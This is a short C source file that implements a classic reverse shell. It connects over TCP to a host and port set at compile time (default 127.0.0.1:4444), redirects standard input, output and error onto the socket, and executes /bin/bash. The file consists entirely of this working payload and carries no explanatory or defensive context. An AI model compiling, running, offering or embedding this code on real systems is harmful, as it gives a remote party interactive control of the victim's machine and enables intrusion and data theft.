#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

#ifndef HOST
#define HOST "127.0.0.1"
#endif

#ifndef PORT
#define PORT 4444
#endif

#ifndef SHELL
#define SHELL "/bin/bash"
#endif

int main(int argc, char *argv[]) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        exit(1);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    if (inet_pton(AF_INET, HOST, &server_addr.sin_addr) <= 0) {
        close(sock);
        exit(1);
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        close(sock);
        exit(1);
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execl(SHELL, SHELL, NULL);
    
    close(sock);
    return 0;
}
